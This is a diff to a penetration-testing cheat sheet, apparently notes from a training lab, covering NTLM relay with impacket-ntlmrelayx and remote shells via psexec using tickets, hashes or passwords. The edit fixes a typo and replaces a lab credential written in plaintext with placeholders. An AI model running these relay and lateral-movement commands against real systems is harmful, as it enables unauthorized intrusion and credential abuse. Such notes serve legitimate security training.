@@ -393,8 +393,6 @@ Redirect NTLM creds to another system.
 The challenge issued by server is always a unique string of characters, here we initiate connection with our target, pass that challenge to the victim and required NTLM hash is generated accordingly. NTLM hashes are not fixed, they change everytime with every request hence holding onto one to pass isn't the best idea
 
 {% hint style="info" %}
-Zeus PEN-200 Challenge Labs
-
 Due to SMB signing being disabled on the system, a relay attack is possible if we can force an authentication.
 {% endhint %}
 
@@ -406,12 +404,12 @@ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.209.159 -c 'po
 
 #### PSexec - Semi shell that writes to $ADMIN share
 
-You got a ticket for Admin? THis the place to be
+You got a ticket for Admin? This the place to be
 
 ```
 export KRB5CCNAME=ticket.ccache; python3 psexec.py [domain]/[user]@[dc_domain] -k -no-pass
 python3 psexec.py -hashes [hash] [user]@[ip] cmd.exe 
-python3 psexec.py zeus.corp/o.foller:EarlyMorningFootball777@192.168.209.160 cmd.exe
+python3 psexec.py [domain]/[user]:[password]@[ip] cmd.exe
 ```
 
 {% embed url="https://medium.com/@allypetitt/windows-remoting-difference-between-psexec-wmiexec-atexec-exec-bf7d1edb5986" %}
